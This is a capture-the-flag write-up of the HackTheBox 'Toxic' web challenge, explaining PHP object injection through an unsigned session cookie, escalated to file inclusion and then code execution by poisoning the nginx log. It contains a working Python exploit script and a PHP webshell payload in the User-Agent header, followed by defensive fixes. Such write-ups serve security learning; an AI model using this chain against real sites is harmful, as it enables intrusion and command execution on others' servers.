## Overview

**Toxic** is an Easy HackTheBox **Web** challenge. It's a tiny PHP site that stores its
"page state" in a `PHPSESSID` cookie. The catch: the app *creates* that cookie by
serializing a PHP object and base64-encoding it, then on every request it
base64-decodes and `unserialize()`s the cookie back into a live object — with no integrity
check. That's a textbook
[PHP object injection / deserialization of untrusted data](https://cwe.mitre.org/data/definitions/502.html),
and one of the app's classes uses a property as an `include()` path, so injection becomes
[local file inclusion](https://cwe.mitre.org/data/definitions/98.html). Poisoning the nginx
access log through the `User-Agent` header then escalates the LFI to remote code execution.

## The technique

The app gives away the whole gadget. `index.php`:

```php
spl_autoload_register(function ($name){           // any class -> include "<name>.php"
    if (preg_match('/Model$/', $name)) $name = "models/${name}";
    include_once "${name}.php";
});

if (empty($_COOKIE['PHPSESSID'])) {               // first visit: set a cookie
    $page = new PageModel;
    $page->file = '/www/index.html';
    setcookie('PHPSESSID', base64_encode(serialize($page)), ...);
}

$cookie = base64_decode($_COOKIE['PHPSESSID']);
unserialize($cookie);                             // trusts attacker-controlled bytes
```

`models/PageModel.php`:

```php
class PageModel {
    public $file;
    public function __destruct() { include($this->file); }   // property-sink gadget
}
```

The default cookie decodes to `O:9:"PageModel":1:{s:4:"file";s:15:"/www/index.html";}` —
the app literally shows you the object shape. Because `PageModel::__destruct()` calls
`include($this->file)` automatically when the script ends, you don't need any method to be
invoked: just deserialize a `PageModel` whose `file` property points wherever you like, and
PHP includes it for free at teardown.

## Solution

The exploit is a two-stage chain wrapped in a small script. The flag is read live by running
it against the instance.

**1 — Forge the cookie (object injection → LFI).** `php -r` can't easily instantiate a
*named* class, so build the serialized string by hand and base64 it. Confirm the file
include with `/etc/passwd` (an `include()` of a non-PHP file just echoes its contents).

**2 — LFI → RCE via log poisoning.** `entrypoint.sh` renames `/flag` to `/flag_<random5>`,
so a static include can't guess the path — you need code execution. nginx logs the
`User-Agent` verbatim into the world-readable `/var/log/nginx/access.log`. Send one request
with a PHP webshell in the `User-Agent`, then include the log file and pass commands via a
GET parameter. `cat /flag_*` globs past the random suffix.

Create `solve.py`:

```python
#!/usr/bin/env python3
# Toxic — PHP object injection -> LFI -> nginx log poisoning -> RCE
import base64, sys, requests

host, port = sys.argv[1], sys.argv[2]
base = f"http://{host}:{port}/"

def cookie_for(path):
    p = f'O:9:"PageModel":1:{{s:4:"file";s:{len(path)}:"{path}";}}'.encode()
    return base64.b64encode(p).decode()

# 1) poison the access log with a PHP webshell in the User-Agent
requests.get(base, headers={"User-Agent": "<?php system($_GET['c']); ?>"})

# 2) include the poisoned log and run commands via ?c=
def run(cmd):
    c = cookie_for("/var/log/nginx/access.log")
    return requests.get(base, params={"c": cmd},
                        cookies={"PHPSESSID": c}, headers={"User-Agent": "x"}).text

run("ls -1 /")                       # locate flag_<random5>
out = run("cat /flag_*")             # glob-read past the random suffix
print([l for l in out.splitlines() if "HTB{" in l][0])
```

Run it against the instance:

```bash
python3 solve.py <target-ip> <target-port>
# -> flag_<random5>
# -> HTB{...}
```

## Why it worked

`unserialize()` on attacker-controlled input rebuilds whatever object the attacker chooses.
When a reachable class has a dangerous magic method (`__destruct`, `__wakeup`, `__toString`)
that uses a property as a sink, deserialization becomes a concrete primitive — here, an
arbitrary `include()`. The LFI then crosses into RCE because nginx reflects an
attacker-controlled header into a log file that the include can reach and execute.

## Fix / defense

- **Never `unserialize()` untrusted data.** Use `json_decode` for cookies/state.
- If `unserialize` is unavoidable, disable object instantiation:
  `unserialize($data, ['allowed_classes' => false]);`
- **Sign** session cookies with an HMAC and verify before decoding, so the value can't be forged.
- Keep side effects (`include`/`eval`/`system`) out of magic methods.
- Don't make logs world-readable or reachable from an include path.
